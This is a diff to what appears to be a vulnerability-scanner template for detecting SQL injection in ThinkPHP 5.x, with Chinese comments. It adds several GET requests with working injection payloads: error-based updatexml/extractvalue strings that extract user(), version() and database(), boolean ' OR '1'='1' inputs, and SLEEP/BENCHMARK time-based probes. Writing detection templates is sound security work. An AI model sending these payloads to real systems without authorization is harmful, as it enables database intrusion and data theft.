@@ -1,7 +1,7 @@
 id: thinkphp-sqli
 info:
   name: ThinkPHP SQL Injection (updatexml)
-  severity: High
+  severity: Critical
   description: |
     检测 ThinkPHP 5.x 版本中存在的 SQL 注入漏洞，利用 updatexml 函数进行报错注入。
     该漏洞通常存在于数组参数的 SQL 查询中。
@@ -13,38 +13,80 @@ info:
     - https://vulhub.org/#/environments/thinkphp/in-sqlinjection/
 
 requests:
-  - method: GET
-    preconditions:
-      methods: [GET]
-    path:
-      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,{{payload}}),0)]=1"
-    payload_sets:
-      default:
-        - "user()"
-        - "version()"
-      aggressive:
-        - "user()"
-        - "version()"
-        - "database()"
-    matchers:
-      - type: word
-        words:
-          - "XPATH syntax error"
-          - "updatexml"
-        condition: or
-        part: body
-      - type: status
-        status: [500]
-
+  # 测试1: 使用updatexml函数进行报错注入
   - method: GET
     preconditions:
       methods: [GET]
     path:
       - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
+      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,version()),0)]=1"
+      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,database()),0)]=1"
     matchers:
       - type: word
         words:
+          - "XPATH syntax error"
+          - "updatexml"
           - "root@"
           - "localhost"
         condition: or
         part: body
+
+  # 测试2: 直接使用user()函数（无payload变量）
+  - method: GET
+    preconditions:
+      methods: [GET]
+    path:
+      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
+      - "{{BaseURL}}/index.php?ids[0,extractvalue(1,concat(0xa,user()))]=1"
+    matchers:
+      - type: word
+        words:
+          - "root@"
+          - "@"
+        condition: or
+        part: body
+      - type: status
+        status: [500]
+
+  # 测试3: 使用version()函数检测数据库版本
+  - method: GET
+    preconditions:
+      methods: [GET]
+    path:
+      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,version()),0)]=1"
+    matchers:
+      - type: regex
+        regex:
+          - "\\d+\\.\\d+\\.\\d+"
+        part: body
+      - type: status
+        status: [500]
+
+  # 测试4: 检查SQL语法错误响应
+  - method: GET
+    preconditions:
+      methods: [GET]
+    path:
+      - "{{BaseURL}}/index.php?ids[' OR '1'='1']=1"
+      - "{{BaseURL}}/index.php?ids[1 AND 1=1]=1"
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "mysql_error"
+          - "syntax error"
+          - "Query failed"
+        condition: or
+        part: body
+
+  # 测试5: 时间盲注检测（通过响应时间差异）
+  - method: GET
+    preconditions:
+      methods: [GET]
+    path:
+      - "{{BaseURL}}/index.php?ids[SLEEP(3)]=1"
+      - "{{BaseURL}}/index.php?ids[BENCHMARK(5000000,SHA1('test'))]=1"
+    matchers:
+      - type: status
+        status: [200]
